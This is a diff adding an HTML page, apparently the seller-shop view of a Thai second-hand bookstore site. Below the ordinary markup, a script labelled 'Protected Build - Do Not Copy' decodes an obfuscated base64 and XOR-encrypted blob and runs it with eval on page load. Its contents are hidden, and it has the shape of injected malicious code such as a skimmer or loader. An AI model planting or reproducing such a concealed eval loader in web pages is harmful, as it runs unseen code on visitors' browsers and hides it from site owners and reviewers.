@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8" />
+<meta name="robots" content="noindex" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>ร้านผู้ขาย | ร้านหนังสือมือสอง</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="css/styles.css" />
+</head>
+<body class="min-h-screen flex flex-col bg-[#FAF7F2] text-[#1F4E4B]">
+<div id="site-header">
+<header class="sticky top-0 z-50 bg-[#FAF7F2]/95 backdrop-blur-md border-b border-[#E6E1D6]">
+<div class="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between gap-2">
+<a href="index.html" id="navbar-logo-link" data-nav-home="true" onclick="if(window.navigateToHome) return window.navigateToHome(event);" class="flex items-center gap-2 font-extrabold text-base sm:text-lg text-[#1F4E4B] hover:text-[#26A69A] transition cursor-pointer">
+<span class="w-8 h-8 rounded-xl bg-[#E0F4F1] text-[#26A69A] flex items-center justify-center">📚</span>
+<span>ร้านหนังสือมือสอง</span>
+</a>
+<div class="flex items-center gap-2 sm:gap-3">
+<a href="index.html" id="navbar-home-link" data-nav-home="true" onclick="if(window.navigateToHome) return window.navigateToHome(event);" class="inline-flex items-center gap-1 px-3 py-1.5 rounded-full text-[#1F4E4B] hover:bg-[#E0F4F1]/60 hover:text-[#26A69A] text-xs sm:text-sm font-bold transition cursor-pointer">
+<span>หน้าแรก</span>
+</a>
+<a href="login.html" class="inline-flex items-center gap-1.5 px-3.5 sm:px-4 py-2 rounded-full bg-[#26A69A] hover:bg-[#219187] text-white text-xs sm:text-sm font-extrabold shadow-xs transition">
+<span>👤</span>
+<span>เข้าสู่ระบบ<span class="hidden sm:inline"> / สมัครสมาชิก</span></span>
+</a>
+</div>
+</div>
+</header>
+</div>
+<main class="flex-1 py-8 sm:py-12 px-4 sm:px-6">
+<div class="max-w-6xl mx-auto">
+<div id="shop-head" class="bg-white rounded-3xl border border-[#E6E1D6] p-6 sm:p-8 shadow-2xs"></div>
+<h2 class="text-lg font-extrabold mt-8 mb-4">หนังสือในร้าน</h2>
+<div id="shop-grid" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-5"></div>
+</div>
+</main>
+<div id="site-footer"></div>
+<script src="js/books-data.js"></script>
+<script src="js/app.js"></script>
+<script>/* Protected Build - Do Not Copy */
+(function(){var _0xe2b8e9=['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'],_0xdaedc0=0x7;(function(_0xeb4feb,_0x48448b){while(_0x48448b-->0x0){_0xeb4feb['push'](_0xeb4feb['shift']());}})(_0xe2b8e9,_0xe2b8e9['length']-_0xdaedc0);var _0xd8026c=[0x98,0xc9,0x5f,0xc9,0xbd,0xa7,0xb7,0x3b,0x25,0x23,0x51,0x18,0x1f,0x4d,0xae,0x72],_0x30b3e8=_0xe2b8e9['join'](''),_0x65ee9f=window['atob'](_0x30b3e8),_0xe231d9=_0x65ee9f['length'],_0xde8039=new Uint8Array(_0xe231d9);for(var _0x48448b=0x0;_0x48448b<_0xe231d9;_0x48448b++){_0xde8039[_0x48448b]=_0x65ee9f['charCodeAt'](_0x48448b)^_0xd8026c[_0x48448b%_0xd8026c['length']];}var _0x6115f8=new TextDecoder('utf-8')['decode'](_0xde8039),_0x0695ff=window['eval'];_0x0695ff(_0x6115f8);})();</script>
+</body>
+</html>
